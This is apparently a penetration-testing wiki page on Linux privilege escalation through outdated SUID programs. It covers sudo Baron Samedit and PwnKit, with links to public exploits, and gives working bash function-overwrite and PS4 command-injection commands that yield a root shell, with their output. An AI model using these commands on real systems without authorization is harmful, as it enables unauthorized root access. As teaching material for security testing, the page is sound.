---
description: >-
  Some common services run with elevated privileges, and can be dangerous if set
  up incorrectly or are outdated
---

# Outdated Versions

## Default SUID binaries

There are some common programs that require the SUID bit to work, like sudo. There is a lot of research into finding vulnerabilities in these programs specifically for Privilege Escalation. You can look up the version of a program with a term like "exploit" or "CVE" to find known exploits for it. [GitHub ](https://github.com/)and [ExploitDB](https://www.exploit-db.com/) are is great resources where Proof of Concepts are often shared, so make sure to search there if you know the program is vulnerable.&#x20;

Here are a few easily exploitable vulnerabilities in common outdated programs:

### Sudo < 1.9.5p2 (CVE-2021-3156)

The `sudoedit` program has a Heap-Based Buffer Overflow vulnerability. For all the technical details see [this writeup](https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31).&#x20;

A simple proof-of-concept script was quickly made in C that you likely need to compile on the target:

{% embed url="https://github.com/CptGibbon/CVE-2021-3156" %}
An exploit of Sudo Baron Samedit written in C
{% endembed %}

If compilers like `gcc` are not available on the target, you could try the Python version:

{% embed url="https://github.com/worawit/CVE-2021-3156" %}
A few versions of the Sudo Baron Samedit exploit written in Python
{% endembed %}

### PwnKit (CVE-2021-4034)

Polkit's `pkexec` program is another SUID binary. It had a vulnerability with the PATH variable allowing you to load an arbitrary shared library, and execute any code you want. For all the technical details see [this writeup](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034).

A proof-of-concept was made in C that you need to compile and run on the target:

{% embed url="https://github.com/arthepsy/CVE-2021-4034" %}
An exploit of PwnKit written in C
{% endembed %}

If compilers like `gcc` are not available on the target, you could try the Python version:

{% embed url="https://github.com/joeammond/CVE-2021-4034" %}
An exploit of PwnKit written in Python
{% endembed %}

## Old Bash Tricks

Bash is by far the most common shell, and has had a few updates to change certain features. In previous versions of bash, there were some tricks to exploit SUID binaries with functions and environment variables. To check the version of bash use:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /bin/bash --version
</strong>GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
</code></pre>

### Bash < 4.2-048 (absolute path overwrite)

In these older bash versions, it was possible to define a function with the name of a full path to a program. This way, if you would specify the full path to that program, it would instead execute the function you defined with the same name. This makes it possible to overwrite absolute paths like `/usr/sbin/service` ran by SUID binaries, by defining a malicious function with the same name:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ function /usr/sbin/service { /bin/bash -p; }  # Define function to get a shell
</strong><strong>$ export -f /usr/sbin/service  # Export function
</strong><strong>$ ./vulnerable
</strong># id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>

### Bash < 4.4 (PS4 variable)

When bash is in debug mode, it has the `PS4` variable which provides a custom prompt when a command is executed by the program. But the variable can run arbitrary commands with the `$()` command substitution syntax. You can set bash in debug mode with `SHELLOPTS=xtrace`, and then just set the `PS4` variable. Getting a direct shell with `/bin/bash -p` has some weird output, so I recommend just copying /bin/bash to another location and setting the SUID bit on it, so you can later run it for your root shell:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)' ./vulnerable
</strong><strong>$ /tmp/bash -p
</strong># id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>
